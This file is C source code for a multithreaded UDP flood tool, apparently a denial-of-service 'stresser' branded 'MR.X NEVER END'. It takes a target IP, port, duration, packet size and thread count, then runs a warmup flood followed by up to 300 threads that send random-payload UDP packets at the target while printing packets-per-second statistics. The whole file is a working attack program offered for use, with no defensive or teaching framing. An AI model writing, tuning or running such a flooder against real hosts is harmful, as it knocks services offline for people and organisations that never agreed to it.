#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>

#define BUFFER_COUNT 768
#define FLOOD_SOCKETS 36
#define MAX_PPS_PER_THREAD 14000
#define WARMUP_SECONDS 4
#define MIN_PACKET_SIZE 20
#define MAX_PACKET_SIZE 1024
#define MIN_THREADS 10
#define MAX_THREADS 300
#define MIN_ATTACK_TIME 10
#define MAX_ATTACK_TIME 600

char *TARGET_IP;
int TARGET_PORT;
int ATTACK_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int warmup_complete = 0;
_Atomic int attack_active = 0;

char *buffers[BUFFER_COUNT];
struct sockaddr_in target_addr;

int get_buf_size(int ps, int tc, int w) {
    long long r = w ? 50000LL : MAX_PPS_PER_THREAD;
    if (r > 1000000LL) r = 1000000LL;
    
    long long b = r * (long long)ps;
    if (b > 1000000000LL) b = 1000000000LL;
    
    long long c = (b * 50LL) / 1000LL;
    if (c < 1048576LL) c = 1048576LL;
    
    int result = (int)(c > 2147483647LL ? 134217728 : c);
    
    if (tc > 100) result = result * 3 / 2;
    else if (tc > 50) result = result * 5 / 4;
    
    if (ps < 64) result = result * 2;
    else if (ps < 128) result = result * 3 / 2;
    
    int minb = 1048576;
    int maxb = 134217728;
    
    if (result < minb) result = minb;
    if (result > maxb) result = maxb;
    
    int opts[] = {result, result/2, result/4, 16777216, 8388608, 4194304, 2097152, 1048576};
    for (int i = 0; i < 8; i++) {
        if (opts[i] >= minb && opts[i] <= maxb) return opts[i];
    }
    return minb;
}

void set_sock_buf(int sock, int ps, int tc, int w) {
    int buf = get_buf_size(ps, tc, w);
    while (buf >= 1048576) {
        if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf)) == 0) break;
        buf = buf / 2;
    }
}

void fill_data(char *buf, int sz, unsigned int sd) {
    for (int i = 0; i < sz; i++) {
        sd = (sd * 1103515245 + 12345);
        buf[i] = (char)((sd >> 16) & 0xFF);
    }
}

void *flood_start(void *arg) {
    int socks[FLOOD_SOCKETS];
    for (int i = 0; i < FLOOD_SOCKETS; i++) socks[i] = -1;
    
    char *pkt = malloc(PACKET_SIZE);
    if (!pkt) {
        atomic_store(&warmup_complete, 1);
        atomic_store(&attack_active, 1);
        return NULL;
    }
    
    fill_data(pkt, PACKET_SIZE, time(NULL) ^ getpid());
    
    int active = 0;
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] < 0) {
            socks[i] = -1;
            continue;
        }
        
        int opt = 1;
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        
        set_sock_buf(socks[i], PACKET_SIZE, FLOOD_SOCKETS, 1);
        
        int flg = fcntl(socks[i], F_GETFL, 0);
        if (flg >= 0) fcntl(socks[i], F_SETFL, flg | O_NONBLOCK);
        
        #ifdef __linux__
        int prio = -20;
        setsockopt(socks[i], SOL_SOCKET, SO_PRIORITY, &prio, sizeof(prio));
        #endif
        
        active++;
    }
    
    struct timeval st, ct;
    gettimeofday(&st, NULL);
    
    for (int sec = 0; sec < WARMUP_SECONDS; sec++) {
        gettimeofday(&ct, NULL);
        long st_us = st.tv_sec * 1000000 + st.tv_usec;
        
        while (1) {
            gettimeofday(&ct, NULL);
            long ct_us = ct.tv_sec * 1000000 + ct.tv_usec;
            if ((ct_us - st_us) >= (sec + 1) * 1000000) break;
            
            int sent = 0;
            for (int i = 0; i < FLOOD_SOCKETS; i++) {
                if (socks[i] < 0) continue;
                
                int burst = (PACKET_SIZE < 64) ? 50 : 35;
                for (int b = 0; b < burst; b++) {
                    int ret = sendto(socks[i], pkt, PACKET_SIZE, MSG_DONTWAIT,
                                    (struct sockaddr*)&target_addr, sizeof(target_addr));
                    
                    if (ret > 0) {
                        sent++;
                        atomic_fetch_add(&total_packets, 1);
                        atomic_fetch_add(&total_bytes, PACKET_SIZE);
                    } else if (ret < 0 && (errno == EAGAIN || errno == EWOULDBLOCK || errno == ENOBUFS)) {
                        break;
                    }
                }
            }
            
            if (sent == 0) usleep(1000);
            else usleep(280);
        }
    }
    
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) close(socks[i]);
    }
    
    free(pkt);
    atomic_store(&warmup_complete, 1);
    usleep(50000);
    atomic_store(&attack_active, 1);
    
    return NULL;
}

int init_buffers() {
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    
    unsigned int base = time(NULL) ^ getpid();
    
    for (int i = 0; i < BUFFER_COUNT; i++) {
        buffers[i] = malloc(PACKET_SIZE);
        if (!buffers[i]) {
            for (int j = 0; j < i; j++) {
                free(buffers[j]);
                buffers[j] = NULL;
            }
            return 0;
        }
        fill_data(buffers[i], PACKET_SIZE, base ^ (i * 1234567));
    }
    return 1;
}

void cleanup_buffers() {
    for (int i = 0; i < BUFFER_COUNT; i++) {
        if (buffers[i]) {
            free(buffers[i]);
            buffers[i] = NULL;
        }
    }
}

void *attack_thread(void *arg) {
    int tid = *((int *)arg);
    
    while (atomic_load(&warmup_complete) == 0) usleep(100);
    
    #ifdef __linux__
    cpu_set_t cs;
    CPU_ZERO(&cs);
    int c = sysconf(_SC_NPROCESSORS_ONLN);
    if (c > 0) {
        CPU_SET(tid % c, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cs);
    }
    #endif
    
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) {
        pthread_exit(NULL);
    }
    
    int o = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o));
    
    set_sock_buf(s, PACKET_SIZE, THREAD_COUNT, 0);
    
    int f = fcntl(s, F_GETFL, 0);
    if (f >= 0) fcntl(s, F_SETFL, f | O_NONBLOCK);
    
    #ifdef __linux__
    int p = -15;
    setsockopt(s, SOL_SOCKET, SO_PRIORITY, &p, sizeof(p));
    #endif
    
    time_t stt = time(NULL);
    int idx = tid % BUFFER_COUNT;
    
    int brst;
    if (PACKET_SIZE < 64) brst = 120;
    else if (PACKET_SIZE < 128) brst = 80;
    else brst = 50;
    
    int trate = 7000;
    int bsec = trate / brst;
    if (bsec < 1) bsec = 1;
    int slp = 1000000 / bsec;
    if (slp < 15) slp = 15;
    if (slp > 50000) slp = 50000;
    
    unsigned long long tsec = 0;
    time_t csec = time(NULL);
    int cfail = 0;
    
    while (atomic_load(&stop_signal) == 0) {
        if (time(NULL) - stt >= ATTACK_TIME) break;
        
        time_t now = time(NULL);
        if (now != csec) {
            tsec = 0;
            csec = now;
            cfail = 0;
        }
        
        if (tsec >= MAX_PPS_PER_THREAD) {
            usleep(15000);
            continue;
        }
        
        int scnt = 0;
        int fcnt = 0;
        
        int ts = brst;
        if (tsec + ts > MAX_PPS_PER_THREAD) {
            ts = MAX_PPS_PER_THREAD - tsec;
        }
        
        for (int i = 0; i < ts; i++) {
            int r = sendto(s, buffers[idx], PACKET_SIZE, MSG_DONTWAIT,
                         (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (r > 0) {
                idx = (idx + 1) % BUFFER_COUNT;
                tsec++;
                scnt++;
                atomic_fetch_add(&total_packets, 1);
                atomic_fetch_add(&total_bytes, PACKET_SIZE);
            } else {
                fcnt++;
                if (errno == EAGAIN || errno == EWOULDBLOCK || errno == ENOBUFS) {
                    cfail++;
                    break;
                }
            }
        }
        
        if (fcnt > scnt && cfail > 3) {
            slp = slp * 3 / 2;
            if (slp > 100000) slp = 100000;
            cfail = 0;
        } else if (scnt > 0 && cfail == 0) {
            if (slp > 15) slp = slp * 9 / 10;
        }
        
        usleep(slp);
    }
    
    close(s);
    pthread_exit(NULL);
}

void *stats_monitor(void *arg) {
    while (atomic_load(&attack_active) == 0) {
        usleep(100000);
    }
    
    sleep(1);
    unsigned long long base = atomic_load(&total_packets);
    
    printf("\n🚀 MR.X NEVER END 🚀 Starting.....\n\n");
    
    unsigned long long prev = base;
    unsigned long long prevb = atomic_load(&total_bytes);
    
    for (int sec = 1; sec <= ATTACK_TIME && atomic_load(&stop_signal) == 0; sec++) {
        sleep(1);
        
        unsigned long long curr = atomic_load(&total_packets);
        unsigned long long currb = atomic_load(&total_bytes);
        
        unsigned long long pps = curr - prev;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        double pk = pps / 1000.0;
        double ppk = atomic_load(&peak_pps) / 1000.0;
        
        printf("🔥 PPS: %.0fK | 📈 Peak: %.0fK | ⚡️MB\n", pk, ppk);
        
        fflush(stdout);
        prev = curr;
        prevb = currb;
    }
    
    unsigned long long fp = atomic_load(&total_packets);
    unsigned long long fb = atomic_load(&total_bytes);
    unsigned long long fpks = atomic_load(&peak_pps);
    
    printf("\n🎉 ALL COMPLETED\n\n");
    
    double ap = (fp > base) ? (fp - base) : 0;
    double avg = ap / (double)ATTACK_TIME;
    
    printf("📊 Total packets: %llu\n", fp);
    printf("💾 Total data: %.2f MB\n", fb / (1024.0 * 1024.0));
    printf("🚀 Peak PPS: %.0fK\n", fpks / 1000.0);
    printf("⚡ Average PPS: %.0fK\n\n", avg / 1000.0);
    
    printf("🔥❤️ MR.X NEVER END ❤️🔥\n");
    
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (ATTACK_TIME < MIN_ATTACK_TIME) ATTACK_TIME = MIN_ATTACK_TIME;
    if (ATTACK_TIME > MAX_ATTACK_TIME) ATTACK_TIME = MAX_ATTACK_TIME;
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address\n");
        return 1;
    }
    
    printf("Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("Packet: %d bytes | Threads: %d\n", PACKET_SIZE, THREAD_COUNT);
    
    if (!init_buffers()) {
        printf("Buffer initialization failed\n");
        return 1;
    }
    
    pthread_t flood_thread;
    if (pthread_create(&flood_thread, NULL, flood_start, NULL) != 0) {
        cleanup_buffers();
        printf("Failed to create warmup thread\n");
        return 1;
    }
    
    pthread_t *threads = NULL;
    int *tids = NULL;
    
    threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    if (!threads) {
        cleanup_buffers();
        printf("Memory allocation failed\n");
        return 1;
    }
    
    tids = malloc(THREAD_COUNT * sizeof(int));
    if (!tids) {
        cleanup_buffers();
        free(threads);
        printf("Memory allocation failed\n");
        return 1;
    }
    
    memset(threads, 0, THREAD_COUNT * sizeof(pthread_t));
    
    int created = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        tids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &tids[i]) == 0) {
            created++;
        }
        if (i % 20 == 0 && i > 0) usleep(2000);
    }
    
    printf("Created %d attack threads\n", created);
    
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    sleep(ATTACK_TIME + 5);
    
    atomic_store(&stop_signal, 1);
    sleep(2);
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (threads[i]) pthread_join(threads[i], NULL);
    }
    
    pthread_join(flood_thread, NULL);
    pthread_join(monitor_thread, NULL);
    
    cleanup_buffers();
    free(threads);
    free(tids);
    
    return 0;
}